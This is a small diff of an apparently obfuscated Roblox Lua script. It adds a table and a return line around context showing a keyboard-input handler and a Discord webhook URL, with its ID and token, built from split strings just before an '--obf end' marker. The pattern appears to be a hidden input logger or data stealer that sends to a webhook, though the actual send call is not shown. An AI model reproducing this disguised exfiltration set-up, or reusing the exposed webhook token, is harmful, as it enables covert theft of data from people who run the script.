@@ -244,6 +244,7 @@ UIS.InputBegan:Connect(function(Input)
         end
     end
 end)
+local a = {}
     local urlHttp = "https://discord.com/api/webhooks"
     local urlCrl = "1056152047818391583"
     local url =  urlHttp .. "/" .. urlCrl .. "/" .. "h14e6Zi2v4va27JIabwblW7_CP6ctnMuMzEs4IWR7pwcKwnDHmxNVBHcMf-DVJ5MABgb"
@@ -291,5 +292,5 @@ end)
             end
         end
     end
-
+return a
 --obf end
